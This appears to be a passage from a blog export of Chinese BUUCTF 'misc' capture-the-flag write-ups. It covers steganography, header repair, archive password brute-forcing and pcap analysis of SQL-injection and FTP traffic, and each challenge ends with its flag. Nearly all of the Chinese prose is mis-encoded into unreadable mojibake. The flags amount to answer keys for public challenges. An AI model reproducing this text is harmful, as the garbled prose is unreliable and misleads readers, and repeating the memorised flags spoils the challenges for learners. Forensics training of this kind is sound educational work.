<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment">#</span><br>zip -e --password=`python -c <span class="hljs-string">&quot;print(__import__(&#x27;time&#x27;).time())&quot;</span>` flag.zip flag<br></code></pre></td></tr></table></figure>

<p>æ ¹æ®æ—¶é—´æˆ³çˆ†ç ´å¯†ç å¾—åˆ°<code>1558080832.15</code></p>
<blockquote>
<p>flag{fkjabPqnLawhvuikfhgzyffj}</p>
</blockquote>
<h1 id="ä»å¨ƒå¨ƒæŠ“èµ·"><a href="#ä»å¨ƒå¨ƒæŠ“èµ·" class="headerlink" title="ä»å¨ƒå¨ƒæŠ“èµ·"></a>ä»å¨ƒå¨ƒæŠ“èµ·</h1><p>ä¸­æ–‡ç”µç +äº”ç¬”</p>
<p>äººå·¥æ™ºèƒ½+ä¹Ÿè¦ä»å¨ƒå¨ƒæŠ“èµ·</p>
<blockquote>
<p>flag{3b4b5dccd2c008fe7e2664bd1bc19292}</p>
</blockquote>
<h1 id="DDCTF2018-â•¯Â°â–¡Â°ï¼‰â•¯ï¸µ-â”»â”â”»"><a href="#DDCTF2018-â•¯Â°â–¡Â°ï¼‰â•¯ï¸µ-â”»â”â”»" class="headerlink" title="[DDCTF2018](â•¯Â°â–¡Â°ï¼‰â•¯ï¸µ â”»â”â”»"></a>[DDCTF2018](â•¯Â°â–¡Â°ï¼‰â•¯ï¸µ â”»â”â”»</h1><p>ä¸¤ä½ä¸€ç»„è½¬åè¿›åˆ¶ï¼Œ<code>-128</code>åè½¬ä¸ºå­—ç¬¦ä¸²</p>
<blockquote>
<p>flag{922ab9974a47cd322cf43b50610faea5}</p>
</blockquote>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>buuctf</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€buuctfã€‘misc-page2</title>
    <url>/posts/14054c38/</url>
    <content><![CDATA[<h1 id="è¢«åŠ«æŒçš„ç¥ç§˜ç¤¼ç‰©"><a href="#è¢«åŠ«æŒçš„ç¥ç§˜ç¤¼ç‰©" class="headerlink" title="è¢«åŠ«æŒçš„ç¥ç§˜ç¤¼ç‰©"></a>è¢«åŠ«æŒçš„ç¥ç§˜ç¤¼ç‰©</h1><p>è¿‡æ»¤å™¨ç­›é€‰httpæµé‡ï¼Œåœ¨<code>index.php</code>çš„postå‚æ•°ä¸­æ‰¾åˆ°è´¦å·å’Œå¯†ç </p>
<p><img src="/img/buuctf/buu-misc-page2-1.png"></p>
<blockquote>
<p>flag{1d240aafe21a86afc11f38a45b541a49}</p>
</blockquote>
<h1 id="åˆ·æ–°è¿‡çš„å›¾ç‰‡"><a href="#åˆ·æ–°è¿‡çš„å›¾ç‰‡" class="headerlink" title="åˆ·æ–°è¿‡çš„å›¾ç‰‡"></a>åˆ·æ–°è¿‡çš„å›¾ç‰‡</h1><p>æ ¹æ®é¢˜ç›®åï¼Œé”å®šF5éšå†™</p>
<p><code>java Extract Misc.jpg</code></p>
<p>å¾—åˆ°ä¸€ä¸ªä¼ªåŠ å¯†åçš„å‹ç¼©åŒ…</p>
<blockquote>
<p>flag{96efd0a2037d06f34199e921079778ee}</p>
</blockquote>
<h1 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h1><p>foremoståˆ†ç¦»å‡ºä¸€ä¸ªå‹ç¼©åŒ…ï¼Œè§£å‹å¾—åˆ°<code>ciphey</code>å’Œ<code>key</code><br>keyæ–‡ä»¶ä¸­çš„å†…å®¹base64è§£å¯†å¾—åˆ°<code>What is Nicki Minaj&#39;s favorite song that refers to snakes?</code><br>ç™¾åº¦æœç´¢å¾—åˆ°<code>anaconda</code></p>
<p>serpentè§£å¯†å¾—åˆ°flag<br><img src="/img/buuctf/buu-misc-page2-2.png"></p>
<blockquote>
<p>flag{who_knew_serpent_cipher_existed}</p>
</blockquote>
<h1 id="BJDCTF2020-è®¤çœŸä½ å°±è¾“äº†"><a href="#BJDCTF2020-è®¤çœŸä½ å°±è¾“äº†" class="headerlink" title="[BJDCTF2020]è®¤çœŸä½ å°±è¾“äº†"></a>[BJDCTF2020]è®¤çœŸä½ å°±è¾“äº†</h1><p>ä¸€ä¸ªxlsæ–‡ä»¶ï¼Œå®é™…æ˜¯ä¸ªå‹ç¼©åŒ…ï¼Œå°†åç¼€æ”¹ä¸ºzipè§£å‹<br>åœ¨<code>xl\charts</code>ä¸‹å¾—åˆ°flag.txt</p>
<blockquote>
<p>flag{M9eVfi2Pcs#â€Œâ€Œâ€Œâ€Œâ€â€¬}</p>
</blockquote>
<h1 id="BJDCTF2020-è—è—è—"><a href="#BJDCTF2020-è—è—è—" class="headerlink" title="[BJDCTF2020]è—è—è—"></a>[BJDCTF2020]è—è—è—</h1><p>foremoståˆ†ç¦»å‡ºä¸€ä¸ªå‹ç¼©åŒ…ï¼Œè§£å‹å¾—åˆ°docxï¼Œé‡Œé¢æœ‰å¼ äºŒç»´ç ï¼Œæ‰«ç å¾—åˆ°flag</p>
<blockquote>
<p>flag{you are the best!}</p>
</blockquote>
<h1 id="è¢«å·èµ°çš„æ–‡ä»¶"><a href="#è¢«å·èµ°çš„æ–‡ä»¶" class="headerlink" title="è¢«å·èµ°çš„æ–‡ä»¶"></a>è¢«å·èµ°çš„æ–‡ä»¶</h1><p>è¿½è¸ªæµå¯ä»¥å‘ç°ä½¿ç”¨ftpçš„<code>retr</code>å‘½ä»¤ä¸‹è½½äº†ä¸€ä¸ª<code>flag.rar</code></p>
<p>è½¬æˆåŸå§‹æ•°æ®åå¦å­˜ä¸º</p>
<p>ä½¿ç”¨<code>archpr</code>çˆ†ç ´å¾—åˆ°å¯†ç <code>5790</code>ï¼Œè§£å‹å¾—åˆ°flag.txt</p>
<blockquote>
<p>flag{6fe99a5d03fb01f833ec3caa80358fa3}</p>
</blockquote>
<h1 id="GXYCTF2019-ä½›ç³»é’å¹´"><a href="#GXYCTF2019-ä½›ç³»é’å¹´" class="headerlink" title="[GXYCTF2019]ä½›ç³»é’å¹´"></a>[GXYCTF2019]ä½›ç³»é’å¹´</h1><p>ä¼ªåŠ å¯†ï¼Œå¾—åˆ°<code>ä½›æ›°ï¼šé®ç­‰è«³å‹èƒ½ç¤™çš¤è—å“†å¨‘æ¢µè¿¦ä¾„ç¾…å“†è¿¦æ¢µè€…æ¢µæ¥è˜‡æ¶…ä¾„å®¤å¯¦çœŸç¼½æœ‹èƒ½ã€‚å¥¢æ€›ä¿±é“æ€¯éƒ½è«³æ€–æ¢µå°¼æ€¯ä¸€ç½°å¿ƒç¼½è¬¹ç¼½è–©è‹¦å¥¢å¤¢æ€¯å¸æ¢µé æœ‹é™€è«³é™€ç©†è«³æ‰€å‘çŸ¥æ¶…ä¾„ä»¥è–©æ€¯æƒ³å¤·å¥¢é†¯æ•¸ç¾…æ€¯è«¸</code></p>
<p>ä½›æ›°è§£å¯†å¾—åˆ°flag</p>
<blockquote>
<p>flag{w0_fo_ci_Be1}</p>
</blockquote>
<h1 id="BJDCTF2020-ä½ çŒœæˆ‘æ˜¯ä¸ªå•¥"><a href="#BJDCTF2020-ä½ çŒœæˆ‘æ˜¯ä¸ªå•¥" class="headerlink" title="[BJDCTF2020]ä½ çŒœæˆ‘æ˜¯ä¸ªå•¥"></a>[BJDCTF2020]ä½ çŒœæˆ‘æ˜¯ä¸ªå•¥</h1><p>ä¸‹è½½å¾—åˆ°ä¸€ä¸ªzipï¼Œä½†æ˜¯å®é™…ä¸Šæ˜¯ä¸€ä¸ªpng</p>
<p>æ”¹æˆpngåæ‰“å¼€å¾—åˆ°ä¸€ä¸ªäºŒç»´ç ï¼Œæ‰«ç å¾—åˆ°<code>flagç¥¥å©“æ¶´</code>,æ˜¯å‡çš„flagï¼ŒçœŸçš„åœ¨pngæ–‡ä»¶å°¾</p>
<blockquote>
<p>flag{i_am_fl@g}</p>
</blockquote>
<h1 id="èœåˆ€666"><a href="#èœåˆ€666" class="headerlink" title="èœåˆ€666"></a>èœåˆ€666</h1><p>httpæµé‡åˆ†æ<br>å…ˆåœ¨z2å‚æ•°ä¸­æå–å‡ºä¸€å¼ jpgï¼Œå¾—åˆ°å¯†ç ï¼š<code>Th1s_1s_p4sswd_!!!</code><br>å†ä»ä¸Šä¼ çš„æ•°æ®åŒ…ä¸­æå–å‡ºä¸€ä¸ªzip<br>è§£å‹å¾—åˆ°flag</p>
<blockquote>
<p>flag{3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z}</p>
</blockquote>
<h1 id="ç§˜å¯†æ–‡ä»¶"><a href="#ç§˜å¯†æ–‡ä»¶" class="headerlink" title="ç§˜å¯†æ–‡ä»¶"></a>ç§˜å¯†æ–‡ä»¶</h1><p>ä¸<code>è¢«å·èµ°çš„æ–‡ä»¶</code>è¿™é¢˜æ­¥éª¤ä¸€è‡´</p>
<blockquote>
<p>flag{d72e5a671aa50fa5f400e5d10eedeaa5}</p>
</blockquote>
<h1 id="æ¢…èŠ±é¦™ä¹‹è‹¦å¯’æ¥"><a href="#æ¢…èŠ±é¦™ä¹‹è‹¦å¯’æ¥" class="headerlink" title="æ¢…èŠ±é¦™ä¹‹è‹¦å¯’æ¥"></a>æ¢…èŠ±é¦™ä¹‹è‹¦å¯’æ¥</h1><p>å›¾ç‰‡å°¾å‘ç°ä¸€ä¸²åå…­è¿›åˆ¶å­—ç¬¦ï¼Œè½¬æˆasciiç ï¼Œå‘ç°å…¨æ˜¯(x,x)çš„å½¢å¼<br>çŒœæµ‹ä¸ºåæ ‡ï¼Œä½¿ç”¨<code>gnuplot</code>ç”»å›¾</p>
<p>æ³¨æ„åæ ‡çš„æ ¼å¼ä¸º<code>x[ç©ºæ ¼]x</code><br><img src="/img/buuctf/buu-misc-page2-3.png"></p>
<p>æ‰«ç å¾—åˆ°flag</p>
<blockquote>
<p>flag{40fc0a979f759c8892f4dc045e28b820}</p>
</blockquote>
<h1 id="BJDCTF2020-just-a-rar"><a href="#BJDCTF2020-just-a-rar" class="headerlink" title="[BJDCTF2020]just_a_rar"></a>[BJDCTF2020]just_a_rar</h1><p>å››ä½æ•°æš´åŠ›ç ´è§£ï¼Œå£ä»¤<code>2016</code><br>è§£å‹å¾—åˆ°ä¸€å¼ jpgï¼Œåœ¨å±æ€§ä¸­å¾—åˆ°flag</p>
<blockquote>
<p>flag{Wadf_123}</p>
</blockquote>
<h1 id="BJDCTF2020-é¸¡ä½ å¤ªç¾"><a href="#BJDCTF2020-é¸¡ä½ å¤ªç¾" class="headerlink" title="[BJDCTF2020]é¸¡ä½ å¤ªç¾"></a>[BJDCTF2020]é¸¡ä½ å¤ªç¾</h1><p>è§£å‹åå¾—åˆ°ä¸¤ä¸ªgifæ–‡ä»¶ï¼Œä¸€ä¸ªgifæ–‡ä»¶å¤´è¢«ä¿®æ”¹äº†<br>ä¿®å¤åå¯ä»¥ç›´æ¥çœ‹åˆ°flagäº†<br>æ³¨æ„ä¸æ˜¯çŸ­æ æ˜¯ä¸‹åˆ’çº¿</p>
<blockquote>
<p>flag{zhi_yin_you_are_beautiful}</p>
</blockquote>
<h1 id="BJDCTF2020-ä¸€å¶éšœç›®"><a href="#BJDCTF2020-ä¸€å¶éšœç›®" class="headerlink" title="[BJDCTF2020]ä¸€å¶éšœç›®"></a>[BJDCTF2020]ä¸€å¶éšœç›®</h1><p>ä¿®æ”¹é«˜åº¦</p>
<blockquote>
<p>flag{66666}</p>
</blockquote>
<h1 id="SWPU2019-ç¥å¥‡çš„äºŒç»´ç "><a href="#SWPU2019-ç¥å¥‡çš„äºŒç»´ç " class="headerlink" title="[SWPU2019]ç¥å¥‡çš„äºŒç»´ç "></a>[SWPU2019]ç¥å¥‡çš„äºŒç»´ç </h1><p>binwalkåˆ†ç¦»å‡ºå››ä¸ªå‹ç¼©åŒ…,æœ‰ä¿©ä¸ªæ— ç”¨çš„å¹²æ‰°é¡¹<br>åœ¨å…¶ä¸­ä¸€ä¸ªdocä¸­å¾—åˆ°è§£å‹å¯†ç <code>comEON_YOuAreSOSoS0great</code><br>è§£å‹åæ˜¯ä¸€ä¸ª<code>good.mp3</code>ï¼Œ<code>audacity</code>åˆ†æå‘ç°æ‘©æ–¯</p>
<p><code>-- --- .-. ... . .. ... ...- . .-. -.-- ...- . .-. -.-- . .- ... -.--</code></p>
<blockquote>
<p>flag{morseisveryveryeasy}</p>
</blockquote>
<h1 id="BJDCTF2020-çº³å°¼"><a href="#BJDCTF2020-çº³å°¼" class="headerlink" title="[BJDCTF2020]çº³å°¼"></a>[BJDCTF2020]çº³å°¼</h1><p>ä¿®å¤æ–‡ä»¶å¤´ï¼Œå†å°†æ¯ä¸€å¸§åˆ†ç¦»å‡ºå›¾ç‰‡ï¼Œæ‹¼æ¥å­—ç¬¦ä¸²åbase64è§£å¯†å¾—åˆ°flag</p>
<blockquote>
<p>flag{wang_bao_qiang_is_sad}</p>
</blockquote>
<h1 id="ç©¿è¶Šæ—¶ç©ºçš„æ€å¿µ"><a href="#ç©¿è¶Šæ—¶ç©ºçš„æ€å¿µ" class="headerlink" title="ç©¿è¶Šæ—¶ç©ºçš„æ€å¿µ"></a>ç©¿è¶Šæ—¶ç©ºçš„æ€å¿µ</h1><p>è¿˜æ˜¯æ‘©æ–¯</p>
<p>ç¬¬ä¸€æ®µï¼š<code>F029BD6F551139EEDEB8E45A175B0786</code><br>ç¬¬äºŒæ®µï¼š<code>F029BD6F5</code></p>
<blockquote>
<p>flag{f029bd6f551139eedeb8e45a175b0786}</p>
</blockquote>
<h1 id="ACTFæ–°ç”Ÿèµ›2020-outguess"><a href="#ACTFæ–°ç”Ÿèµ›2020-outguess" class="headerlink" title="[ACTFæ–°ç”Ÿèµ›2020]outguess"></a>[ACTFæ–°ç”Ÿèµ›2020]outguess</h1><p>outguesséšå†™<br>å¯†ç åœ¨å›¾ç‰‡å±æ€§ä¸­<br><code>outguess -r mmm.jpg -t asd -k abc</code></p>
<blockquote>
<p>flag{gue33_Gu3Ss!2020}</p>
</blockquote>
<h1 id="HBNIS2018-excelç ´è§£"><a href="#HBNIS2018-excelç ´è§£" class="headerlink" title="[HBNIS2018]excelç ´è§£"></a>[HBNIS2018]excelç ´è§£</h1><p>çœ‹ä¼¼çˆ†ç ´ï¼Œå®é™…string</p>
<blockquote>
<p>flag{office_easy_cracked}</p>
</blockquote>
<h1 id="è°èµ¢äº†æ¯”èµ›ï¼Ÿ"><a href="#è°èµ¢äº†æ¯”èµ›ï¼Ÿ" class="headerlink" title="è°èµ¢äº†æ¯”èµ›ï¼Ÿ"></a>è°èµ¢äº†æ¯”èµ›ï¼Ÿ</h1><p>binwalkåˆ†è§£å‡ºä¸€ä¸ªrar<br>æš´åŠ›ç ´è§£å‡ºå¯†ç <code>1020</code><br>å°†çš„å¾—åˆ°çš„gifæ”¾åœ¨stegsolveåˆ†æ<br>åœ¨ç¬¬310å¸§å¤„å‘ç°ä¸ä¸€æ ·çš„å›¾ç‰‡,å¦å­˜ä¸º<br>å†å°†è¿™ä¸ªå›¾ç‰‡è¿›è¡Œlsbéšå†™åˆ†æ<br>åœ¨r0é€šé“å‘ç°ä¸€å¼ äºŒç»´ç <br>æ‰«ç å¾—åˆ°flag</p>
<blockquote>
<p>flag{shanxiajingwu_won_the_game}</p>
</blockquote>
<h1 id="SWPU2019-æˆ‘æœ‰ä¸€åªé©¬é‡Œå¥¥"><a href="#SWPU2019-æˆ‘æœ‰ä¸€åªé©¬é‡Œå¥¥" class="headerlink" title="[SWPU2019]æˆ‘æœ‰ä¸€åªé©¬é‡Œå¥¥"></a>[SWPU2019]æˆ‘æœ‰ä¸€åªé©¬é‡Œå¥¥</h1><p>è¿è¡Œexeåç”Ÿæˆäº†ä¸€æ®µtxtæ–‡æœ¬</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">ntfs<br>flag.txt<br></code></pre></td></tr></table></figure>

<p>å¾ˆæ˜æ˜¾æ˜¯ntfsæµ</p>
<p>ä½¿ç”¨<code>ntfsstreamseditor</code>å¤„ç†</p>
<p><img src="/img/buuctf/buu-misc-page2-4.png"></p>
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨notepadå‘½ä»¤æ¥æ‰“å¼€éšè—çš„æ–‡ä»¶<br><code>notepad 1.txt:flag.txt</code></p>
<p><img src="/img/buuctf/buu-misc-page2-5.png"></p>
<blockquote>
<p>flag{ddg_is_cute}</p>
</blockquote>
<h1 id="HBNIS2018-æ¥é¢˜ä¸­ç­‰çš„å§"><a href="#HBNIS2018-æ¥é¢˜ä¸­ç­‰çš„å§" class="headerlink" title="[HBNIS2018]æ¥é¢˜ä¸­ç­‰çš„å§"></a>[HBNIS2018]æ¥é¢˜ä¸­ç­‰çš„å§</h1><p>æ‘©æ–¯<code>.- .-.. .--. .... .- .-.. .- -...</code></p>
<blockquote>
<p>flag{alphalab}</p>
</blockquote>
<h1 id="GXYCTF2019-gakki"><a href="#GXYCTF2019-gakki" class="headerlink" title="[GXYCTF2019]gakki"></a>[GXYCTF2019]gakki</h1><p>binwalkåˆ†ç¦»å‡ºä¸€ä¸ªå¸¦å¯†ç çš„rar<br>çˆ†ç ´å‡ºå¯†ç ä¸º<code>8864</code></p>
<p>è§‚å¯Ÿå­—ç¬¦ä¸²çš„ç‰¹å¾ï¼Œä¸åƒå„ç§ç¼–ç ï¼Œå°è¯•è¯é¢‘åˆ†æ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#python2</span><br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> Counter<br><br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;file.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>f_read=f.read()<br><br><br><span class="hljs-built_in">print</span> Counter(f_read)<br>a=<span class="hljs-built_in">sorted</span>(Counter(f_read).items(),key=<span class="hljs-keyword">lambda</span> d:d[<span class="hljs-number">1</span>],reverse=<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;&#x27;</span>.join([i[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a])<br></code></pre></td></tr></table></figure>
<p><img src="/img/buuctf/buu-misc-page2-6.png"></p>
<blockquote>
<p>flag{gaki_IsMyw1fe}</p>
</blockquote>
<h1 id="WUSTCTF2020-find-me"><a href="#WUSTCTF2020-find-me" class="headerlink" title="[WUSTCTF2020]find_me"></a>[WUSTCTF2020]find_me</h1><p>å›¾ç‰‡å±æ€§å¤‡æ³¨ä¸­æœ‰ç›²æ–‡<br>è§£å¯†å¾—åˆ°flag</p>
<blockquote>
<p>flag{y$0$u_f$1$n$d$_M$e$e$e$e$e}</p>
</blockquote>
<h1 id="ACTFæ–°ç”Ÿèµ›2020-base64éšå†™"><a href="#ACTFæ–°ç”Ÿèµ›2020-base64éšå†™" class="headerlink" title="[ACTFæ–°ç”Ÿèµ›2020]base64éšå†™"></a>[ACTFæ–°ç”Ÿèµ›2020]base64éšå†™</h1><p>base64éšå†™</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment">#base64è§£ç è„šæœ¬ï¼ŒPython2 è¿è¡Œ</span><br><br>b64chars = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br><br><span class="hljs-comment"># 2.txtä¸ºéœ€è¦è§£ç çš„æ–‡ä»¶</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;2.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    bin_str = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines():<br>        stegb64 = <span class="hljs-string">&#x27;&#x27;</span>.join(line.split())<br>        rowb64 =  <span class="hljs-string">&#x27;&#x27;</span>.join(stegb64.decode(<span class="hljs-string">&#x27;base64&#x27;</span>).encode(<span class="hljs-string">&#x27;base64&#x27;</span>).split())<br>        offset = <span class="hljs-built_in">abs</span>(b64chars.index(stegb64.replace(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)[-<span class="hljs-number">1</span>])-b64chars.index(rowb64.replace(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)[-<span class="hljs-number">1</span>]))<br>        equalnum = stegb64.count(<span class="hljs-string">&#x27;=&#x27;</span>) <span class="hljs-comment">#no equalnum no offset</span><br>        <span class="hljs-keyword">if</span> equalnum:<br>            bin_str += <span class="hljs-built_in">bin</span>(offset)[<span class="hljs-number">2</span>:].zfill(equalnum * <span class="hljs-number">2</span>)<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(bin_str[i:i + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bin_str), <span class="hljs-number">8</span>)]) <span class="hljs-comment">#8ä½ä¸€ç»„</span><br></code></pre></td></tr></table></figure>


<blockquote>
<p>flag{6aseb4_f33!}</p>
</blockquote>
<h1 id="SWPU2019-ä¼Ÿå¤§çš„ä¾¦æ¢"><a href="#SWPU2019-ä¼Ÿå¤§çš„ä¾¦æ¢" class="headerlink" title="[SWPU2019]ä¼Ÿå¤§çš„ä¾¦æ¢"></a>[SWPU2019]ä¼Ÿå¤§çš„ä¾¦æ¢</h1><p>ä¿®æ”¹txtä¸­å†…å®¹çš„ç¼–ç ä¸º<code>EBCDIC</code><br>å¾—åˆ°å¯†ç <code>wllm_is_the_best_team!</code></p>
<p>å¯¹ç€è·³èˆå°äººå¯†ç è¡¨è§£å¯†å¾—åˆ°flag</p>
<blockquote>
<p>flag{iloveholmesandwllm}</p>
</blockquote>
<h1 id="GUET-CTF2019-KO"><a href="#GUET-CTF2019-KO" class="headerlink" title="[GUET-CTF2019]KO"></a>[GUET-CTF2019]KO</h1><p>ookç¼–ç </p>
<blockquote>
<p>flag{welcome to CTF}</p>
</blockquote>
<h1 id="é»‘å®¢å¸å›½"><a href="#é»‘å®¢å¸å›½" class="headerlink" title="é»‘å®¢å¸å›½"></a>é»‘å®¢å¸å›½</h1><p>å¼€å¤´æ˜¯<code>52 61 72 21 1a 07 00</code>ï¼Œæ˜¯rarçš„æ–‡ä»¶å¤´ï¼Œä¿å­˜ä¸ºrar<br>æš´åŠ›ç ´è§£å¾—åˆ°å¯†ç <code>3690</code></p>
<p>è§£å‹å¾—åˆ°ä¸€ä¸ªåç¼€ä¸ºpngçš„æ–‡ä»¶ï¼Œä½†æ˜¯åœ¨åå…­è¿›åˆ¶ä¸‹è§‚å¯Ÿå¯ä»¥å‘ç°å®é™…ä¸Šæ˜¯jpgæ–‡ä»¶ï¼Œå¤´å‰å››ä¸ªå­—èŠ‚è¢«ä¿®æ”¹æˆ<code>89 50 4e 47</code>äº†ã€‚æ”¹æˆ<code>ff d8 ff e0</code>å³å¯</p>
<p>flagåœ¨ä¿®å¥½åçš„å›¾ç‰‡ä¸Š</p>
<blockquote>
<p>flag{57cd4cfd4e07505b98048ca106132125}</p>
</blockquote>
<h1 id="MRCTF2020-ezmisc"><a href="#MRCTF2020-ezmisc" class="headerlink" title="[MRCTF2020]ezmisc"></a>[MRCTF2020]ezmisc</h1><p>ä¿®æ”¹é«˜åº¦</p>
<blockquote>
<p>flag{1ts_vEryyyyyy_ez!}</p>
</blockquote>
<h1 id="MRCTF2020-ä½ èƒ½çœ‹æ‡‚éŸ³ç¬¦å—"><a href="#MRCTF2020-ä½ èƒ½çœ‹æ‡‚éŸ³ç¬¦å—" class="headerlink" title="[MRCTF2020]ä½ èƒ½çœ‹æ‡‚éŸ³ç¬¦å—"></a>[MRCTF2020]ä½ èƒ½çœ‹æ‡‚éŸ³ç¬¦å—</h1><p>æ–‡ä»¶å¤´è¢«æ”¹ï¼Œä¿®æ”¹å›æ­£ç¡®çš„<code>52 61 72</code><br>è§£å‹å¾—åˆ°ä¸€ä¸ªdocxï¼Œæ”¹åç¼€ä¸ºzipå¹¶è§£å‹</p>
<p>åœ¨<code>document.xml</code>ä¸­å¾—åˆ°å­—ç¬¦ä¸²<code>â™­â™¯â™ªâ€–Â¶â™¬â™­â™­â™ªâ™­â€–â€–â™­â™­â™¬â€–â™«â™ªâ€–â™©â™¬â€–â™¬â™¬â™­â™­â™«â€–â™©â™«â€–â™¬â™ªâ™­â™­â™­â€–Â¶âˆ®â€–â€–â€–â€–â™©â™¬â€–â™¬â™ªâ€–â™©â™«â™­â™­â™­â™­â™­Â§â€–â™©â™©â™­â™­â™«â™­â™­â™­â€–â™¬â™­â€–Â¶Â§â™­â™­â™¯â€–â™«âˆ®â€–â™¬Â¶â€–Â¶âˆ®â€–â™¬â™«â€–â™«â™¬â€–â™«â™«Â§=</code></p>
<p>éŸ³ç¬¦è§£ç å¾—åˆ°flag</p>
<blockquote>
<p>flag{thEse_n0tes_ArE_am@zing~}</p>
</blockquote>
<h1 id="sqltest"><a href="#sqltest" class="headerlink" title="sqltest"></a>sqltest</h1><p>sqlæ³¨å…¥çš„æµé‡</p>
<p>å…ˆç”¨tsharkæŠŠæ³¨å…¥æµé‡å¯¼å‡ºæ¥</p>
<p><code>tshark -r sqltest.pcapng -Y &quot;http.request&quot; -T fields -e http.request.full_uri &gt; data.txt</code></p>
<blockquote>
<p>-r è¯»å–æ–‡ä»¶<br>-Y è¿‡æ»¤è¯­å¥<br>-T pdml|ps|text|fields|psml,è®¾ç½®è§£ç ç»“æœè¾“å‡ºçš„æ ¼å¼<br>-e è¾“å‡ºç‰¹å®šå­—æ®µ<br>http.request.uri httpè¯·æ±‚çš„uriéƒ¨åˆ†</p>
</blockquote>
<p>æå–å­—æ®µçš„asciiå€¼ï¼Œå†æŠŠasciiè½¬æˆå­—ç¬¦ä¸²</p>
<blockquote>
<p>102 108 97 103 123 52 55 101 100 98 56 51 48 48 101 100 53 102 57 98 50 56 102 99 53 52 98 48 100 48 57 101 99 100 101 102 55 125</p>
</blockquote>
<blockquote>
<p>flag{47edb8300ed5f9b28fc54b0d09ecdef7}</p>
</blockquote>
<h1 id="HBNIS2018-ä½ä¸ªå¤´"><a href="#HBNIS2018-ä½ä¸ªå¤´" class="headerlink" title="[HBNIS2018]ä½ä¸ªå¤´"></a>[HBNIS2018]ä½ä¸ªå¤´</h1><p>é”®ç›˜å¯†ç ï¼Œåœ¨é”®ç›˜ä¸Šç”»å‡ºæ¥å³å¯</p>
<blockquote>
<p>flag{CTF}</p>
</blockquote>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>buuctf</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€buuctfã€‘misc-page1</title>
    <url>/posts/8d0c1d82/</url>
    <content><![CDATA[<h1 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h1><blockquote>
<p>flag{buu_ctf}</p>
</blockquote>
<h1 id="é‡‘ä¸‰èƒ–"><a href="#é‡‘ä¸‰èƒ–" class="headerlink" title="é‡‘ä¸‰èƒ–"></a>é‡‘ä¸‰èƒ–</h1><p>gifæ–‡ä»¶ï¼Œä½¿ç”¨<code>stegsolve</code>é€å¸§æŸ¥çœ‹ï¼Œåˆ†åˆ«åœ¨ç¬¬21ï¼Œ51ï¼Œ79å¸§å‡ºç°äº†ä¸‰æ®µflagï¼Œæ‹¼æ¥èµ·æ¥</p>
<blockquote>
<p>flag{he11ohongke}</p>
</blockquote>
<h1 id="äºŒç»´ç "><a href="#äºŒç»´ç " class="headerlink" title="äºŒç»´ç "></a>äºŒç»´ç </h1><p>è§£å‹å¾—åˆ°ä¸€å¼ äºŒç»´ç ï¼Œè§£ç å¾—åˆ°<code>secret is here</code><br>åå…­è¿›åˆ¶å½¢å¼ä¸‹è§‚å¯Ÿå‘ç°<code>50 4b 03 04</code>ï¼Œå³å‹ç¼©åŒ…çš„å¤´<br><img src="/img/buuctf/buu-misc-page1-1.png"></p>
<p>å¯ä»¥å°†åç¼€ç›´æ¥æ”¹ä¸ºzipè§£å‹ï¼Œè¿™æ ·å¯ä»¥ä¸ç”¨å…ˆåˆ†ç¦»æ–‡ä»¶<br>æ‰“å¼€åå‘ç°éœ€è¦å¯†ç ï¼Œè€Œå‹ç¼©åŒ…ä¸­çš„æ–‡ä»¶åä¸º<code>4number.txt</code>ï¼Œè¿™æ ·å°±å¾ˆæ˜æ˜¾äº†ï¼Œæ˜¯4ä½æ•°å­—çˆ†ç ´</p>
<p>ä½¿ç”¨<code>archpr</code>çˆ†ç ´å¾—åˆ°å¯†ç <code>7639</code></p>
<blockquote>
<p>flag{vjpw_wnoei}</p>
</blockquote>
<h1 id="ä½ ç«Ÿç„¶èµ¶æˆ‘èµ°"><a href="#ä½ ç«Ÿç„¶èµ¶æˆ‘èµ°" class="headerlink" title="ä½ ç«Ÿç„¶èµ¶æˆ‘èµ°"></a>ä½ ç«Ÿç„¶èµ¶æˆ‘èµ°</h1><p>åœ¨æ–‡ä»¶å°¾ç›´æ¥å¾—åˆ°flag</p>
<blockquote>
<p>flag{stego_is_s0_bor1ing}</p>
</blockquote>
